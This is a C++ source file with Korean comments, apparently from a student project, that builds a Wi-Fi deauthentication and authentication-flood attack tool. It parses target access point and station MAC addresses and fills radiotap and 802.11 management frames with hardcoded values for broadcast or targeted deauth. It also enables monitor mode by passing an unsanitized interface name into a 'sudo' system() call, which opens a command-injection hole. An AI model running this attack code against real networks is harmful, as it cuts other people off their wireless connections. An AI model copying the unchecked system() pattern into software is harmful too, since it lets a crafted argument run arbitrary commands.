#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "attack_frame.h"

int choose_deauth(int argc, char * argv[])
{
    switch(argc) {

        // 입력값 부족
        case 2:
            fprintf(stderr, "Usage: %s or <interface> or <ap_mac>\n", argv[0]);
            return 1;

        //올바른 맥값 넣었는지 검증필요(추후구현)

        // 브로드캐스트
        case 3:
            printf("---------Deauth-Attack---------\n");
            printf("<Broadcast>\n");
            return 2;

        
        case 4:

            // 양쪽 전송
            printf("---------Deauth-Attack---------\n");
            printf("<ap_mac>: %s -> <station_mac>: %s \n", argv[2], argv[3]);
            printf("<station_mac>: %s -> <ap_mac>: %s \n", argv[3], argv[2]);
            return 3;
            

        case 5:
        // auth 공격
       
            printf("----------Auth-Attack----------\n");
            printf("<station_mac>: %s -> <ap_mac>: %s \n", argv[3], argv[2]);
            return 4;

        // 초과 입력
        default:
            fprintf(stderr, "Less Input Please!\n");
            return 5;
    }
}

// 맥주소 리틀앤디안으로
void convert_mac_address(const char* mac_str, char* mac_bytes) {
     int values[6];
    sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    
    // 변환된 MAC 주소를 바이트 배열에 저장
    for(int i = 0; i < 6; ++i) {
        mac_bytes[i] = (uint8_t)values[i];
    }
}

// 채우는 거
void fill_deauth_frame(Deauthentication_Frame & deauth_frame)
{
    deauth_frame.radiotap_header.header_revision = 0;
    deauth_frame.radiotap_header.header_pad = 0;
    deauth_frame.radiotap_header.header_length = 0x0018;
    deauth_frame.radiotap_header.present_flags[0] = 0xa000402e;
    deauth_frame.radiotap_header.present_flags[1] = 0x00000820;
    deauth_frame.radiotap_header.flags= 0x00;
    deauth_frame.radiotap_header.data_rate=0x02;
    deauth_frame.radiotap_header.channel_frequency=0x099e;
    deauth_frame.radiotap_header.channel_flags=0x00a0;
    deauth_frame.radiotap_header.antenna_signal1=0xa5;
    deauth_frame.radiotap_header.empty_field=0;
    deauth_frame.radiotap_header.rx_flags=0x0000;
    deauth_frame.radiotap_header.antenna_signal2= 0xa5;
    deauth_frame.radiotap_header.antenna=0x00;

    deauth_frame.deauthentication_main_frame.frame_control_field=0x08c0;
    deauth_frame.deauthentication_main_frame.duration=0x013a;
    // 채워야할 값 frame.deauthentication_main_frame.destination_address=
    // 채워야할 값 frame.deauthentication_main_frame.source_address=
    // frame.deauthentication_main_frame.bss_id=
    deauth_frame.deauthentication_main_frame.fragment_sequence=0x2290;
    deauth_frame.wireless_management.reason_code = 0x0006;

}

void fill_auth_frame(Authentication_Frame & auth_frame)
{
    auth_frame.radiotap_header.header_revision = 0;
    auth_frame.radiotap_header.header_pad = 0;
    auth_frame.radiotap_header.header_length = 0x0018;
    auth_frame.radiotap_header.present_flags[0] = 0xa000402e;
    auth_frame.radiotap_header.present_flags[1] = 0x00000820;
    auth_frame.radiotap_header.flags= 0x00;
    auth_frame.radiotap_header.data_rate=0x02;
    auth_frame.radiotap_header.channel_frequency=0x098a;
    auth_frame.radiotap_header.channel_flags=0x00a0;
    auth_frame.radiotap_header.antenna_signal1=0xcb;
    auth_frame.radiotap_header.empty_field=0;
    auth_frame.radiotap_header.rx_flags=0x0000;
    auth_frame.radiotap_header.antenna_signal2= 0xcb;
    auth_frame.radiotap_header.antenna=0x00;

    auth_frame.authentication_main_frame.frame_control_field=0x00b0;
    auth_frame.authentication_main_frame.duration=0x013a;
    // 채워야할 값 frame.deauthentication_main_frame.destination_address=
    // 채워야할 값 frame.deauthentication_main_frame.source_address=
    // frame.deauthentication_main_frame.bss_id=
    auth_frame.authentication_main_frame.fragment_sequence=0xe8e0;
    
    auth_frame.wireless_management.authentication_algorithm=0x0000;
    auth_frame.wireless_management.authentication_seq=0x0001;
    auth_frame.wireless_management.status_code=0x0000;

    auth_frame.wireless_management.tag_number1=0xdd;
    auth_frame.wireless_management.tag_length1=0x0b;
    uint8_t oui1[3] = {0x00, 0x17, 0xf2};
    memcpy(auth_frame.wireless_management.oui1, oui1,3);
    auth_frame.wireless_management.vender_specific_oui_type1=0x0a;
    uint8_t data1[7] = {0x00, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00};
    memcpy(auth_frame.wireless_management.vender_specific_data1, data1,7);
    
    auth_frame.wireless_management.tag_number2=0xdd;
    auth_frame.wireless_management.tag_length2=0x0a;
    uint8_t oui2[3] = {0x00, 0x10, 0x18};
    memcpy(auth_frame.wireless_management.oui2, oui2,3);
    auth_frame.wireless_management.vender_specific_oui_type2=0x02;
    uint8_t data2[6] = {0x00, 0x00, 0x10, 0x00, 0x00, 0x02};
    memcpy(auth_frame.wireless_management.vender_specific_data2, data2,6);
    
}

// 모니터 모드 자동 실행
void start_monitor_mode(char *interface) {
    char command[100];
    sprintf(command, "sudo gmon %s", interface);
    system(command);
}